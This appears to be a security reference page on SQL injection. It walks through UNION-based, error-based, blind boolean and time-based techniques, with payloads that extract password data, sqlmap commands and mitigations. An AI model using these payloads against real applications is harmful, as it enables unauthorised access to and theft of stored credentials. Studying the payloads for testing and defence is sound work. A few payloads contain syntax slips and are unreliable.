# SQL Injection

Structured Query Language (SQL) injection is a code injection technique where an attacker
inserts malicious SQL statements into an application query, typically through user-supplied
input. This page covers four common exploitation paths: UNION-based, error-based, blind
boolean-based, and time-based SQLi.

---

## UNION-Based SQL Injection

**Category:** Data Extraction (In-band)
**Severity context:** High — directly retrieves arbitrary database content in the query
response, no out-of-band channel needed.

### How to identify it
Look for parameters that reflect database content in the HTTP response. Submit a single quote
(`'`) or a SQL break character and check for a database error in the response. Then confirm
by injecting a benign always-true condition (`' OR 1=1 -- -`) and an always-false condition
(`' AND 1=2 -- -`) — if the first returns results and the second doesn't, SQL injection is
confirmed.

### How it works
UNION allows combining the results of two SELECT queries into a single result set. If you can
control part of the original query's WHERE clause, you can append a UNION SELECT that returns
data from any table the database user has access to. The tough part is matching the column
count and data types of the original query.

### Exploitation
```sql
-- Step 1: Determine column count via ORDER BY (increment until error)
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
-- Error on ORDER BY 4 → 3 columns

-- Step 2: Find which columns accept string data
' UNION SELECT 'a',NULL,NULL -- -
' UNION SELECT NULL,'a',NULL -- -
' UNION SELECT NULL,NULL,'a' -- -
-- Response shows 'a' → that column outputs text

-- Step 3: Extract database version / user / database name
' UNION SELECT @@version,user(),database() -- -          -- MySQL/MSSQL
' UNION SELECT version(),current_user,current_database() -- -  -- PostgreSQL

-- Step 4: Enumerate tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables -- -

-- Step 5: Dump a table
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns
  WHERE table_name='users' -- -
' UNION SELECT username,password,NULL FROM users -- -
```

### Example
```
Parameter:  ?id=1
Payload:    ?id=1 UNION SELECT username,password,NULL FROM users -- -
Response:   Displays admin's hashed password alongside normal content.
```

### Mitigation
Use parameterized queries (prepared statements) everywhere — never concatenate user input
into SQL strings. Apply least-privilege database accounts (no `SELECT` on `information_schema`
for the web user if possible). Use an ORM that handles parameterization natively.

### References
- [PortSwigger: SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## Error-Based SQL Injection

**Category:** Information Disclosure / Data Extraction (In-band via errors)
**Severity context:** Medium-High — extracts data through verbose database error messages.
Only works when the application displays database errors.

### How to identify it
Submit a single quote (`'`) into any parameter and look for verbose SQL errors in the HTTP
response (e.g. `You have an error in your SQL syntax; ... near '' at line 1`). If errors are
suppressed (no error shown), error-based extraction won't work, but the parameter may still
be injectable via other techniques.

### How it works
Certain database functions (e.g. MySQL `extractvalue()`, `updatexml()`, `GTID_SUBSET()`) or
type-conversion tricks (e.g. PostgreSQL `CAST`, MSSQL `CONVERT`) intentionally produce errors
that include the result of a subquery. By embedding your data-stealing query inside one of
these functions, the error message itself carries the stolen value.

### Exploitation
```sql
-- MySQL: extractvalue() (max 32 chars per call)
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) -- -

-- MySQL: updatexml()
' AND updatexml(1, concat(0x7e, (SELECT password FROM users LIMIT 1)), 1) -- -

-- MySQL: double-query / subquery with count(*) and floor()
' AND (SELECT 1 FROM (SELECT count(*), concat(
    (SELECT password FROM users LIMIT 1), floor(rand()*2)
  ) x FROM information_schema.tables GROUP BY x) y) -- -

-- PostgreSQL: CAST type confusion
' OR CAST((SELECT password FROM users LIMIT 1) AS int) = 1 -- -

-- MSSQL: Convert with invalid type
' OR convert(int, (SELECT TOP 1 password FROM users)) = 1 -- -
```

### Example
```
Payload:  ?id=1 AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) -- -
Error:    XPATH syntax error: '~admin_hashed_pass'
```

### Mitigation
Disable or suppress detailed database error messages in production (`display_errors = Off`
for PHP, custom error pages). Use parameterized queries to eliminate injection entirely.

### References
- [PortSwigger: SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [MySQL EXPLAIN / extractvalue docs](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html)

---

## Blind Boolean-Based SQL Injection

**Category:** Data Extraction (Inferential)
**Severity context:** Medium — slower to exploit than in-band, but equally dangerous. Each
bit of data requires many requests. Automated tools (sqlmap) handle this efficiently.

### How to identify it
Inject an always-true condition (`' AND 1=1 -- -`) and an always-false condition
(`' AND 1=2 -- -`) into a parameter. If the first produces a different response (different
content, length, status code, or HTTP behavior) than the second, the parameter is injectable
even though no database content is rendered.

### How it works
The application returns a distinct response when a query returns rows vs. when it returns
empty (e.g. "Welcome back!" vs. "Invalid username"). You exploit this by asking yes/no
questions about the database, one character at a time — e.g. "Is the first letter of the
admin password greater than 'm'?" The response difference tells you yes or no.

### Exploitation
```sql
-- Confirm injection via response differential
' AND 1=1 -- -   → normal page
' AND 1=2 -- -   → different page / missing content

-- Probe database version character by character
' AND SUBSTRING(@@version, 1, 1) = '8' -- -   → true  (MySQL 8.x)
' AND SUBSTRING(@@version, 1, 1) = '5' -- -   → false

-- Extract password length
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5 -- -
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 20 -- -

-- Extract password character by character (ASCII comparison)
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 64 -- -
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97 -- -

-- Automate with sqlmap
sqlmap -u "http://target.com/page?id=1" --batch --technique=B --dump
```

### Example
```
Testing:   ?user=admin' AND SUBSTRING(password,1,1)='a' -- -
Response:  "Welcome back!" (true → first char starts with 'a')
Testing:   ?user=admin' AND SUBSTRING(password,1,1)='b' -- -
Response:  "Invalid username" (false → first char is 'a')
```

### Mitigation
Parameterized queries eliminate all SQL injection, including blind. If you see response
differentials, the root cause is unsanitized concatenation — fix that, not the response.

### References
- [PortSwigger: Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- [sqlmap](https://sqlmap.org/)

---

## Time-Based Blind SQL Injection

**Category:** Data Extraction (Inferential / Out-of-band)
**Severity context:** Medium — slowest technique (one bit per request, waiting for sleep).
Used when the response has no visible content differential (identical responses for true/false
queries). Authoritative: you have SQLi if you can make the database sleep.

### How to identify it
Inject a time-delay conditional and compare response times. If a true condition causes a
multi-second delay and a false condition returns immediately, injection is confirmed.

### How it works
When the application suppresses all response differences (same HTML regardless of query
result), you cannot use boolean-based differentials. Instead, you inject a conditional that
calls a database sleep function when true. By measuring response time, you infer the answer
to yes/no questions about the database.

### Exploitation
```sql
-- MySQL
' IF(1=1, SLEEP(5), 0) -- -

-- PostgreSQL
' OR (CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -

-- MSSQL
' IF (1=1) WAITFOR DELAY '0:0:5' -- -

-- Confirm injection
' IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 64),
    SLEEP(3), 0) -- -   → 3s delay (true)
' IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 128),
    SLEEP(3), 0) -- -   → instant (false)

-- Automate with sqlmap
sqlmap -u "http://target.com/page?id=1" --batch --technique=T --dump
```

### Example
```
Request:   ?id=1' IF((SELECT LENGTH(password) FROM users WHERE username='admin')=20,
           SLEEP(3), 0) -- -
Response:  Takes 3.1 seconds → password is 20 characters
```

### Mitigation
Same as all other SQLi — parameterized queries. No amount of input filtering or WAF rules
reliably blocks every variant of time-based injection. Prepared statements eliminate the
class entirely.

### References
- [PortSwigger: Blind SQL injection (time-based)](https://portswigger.net/web-security/sql-injection/blind/time-based)
- [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
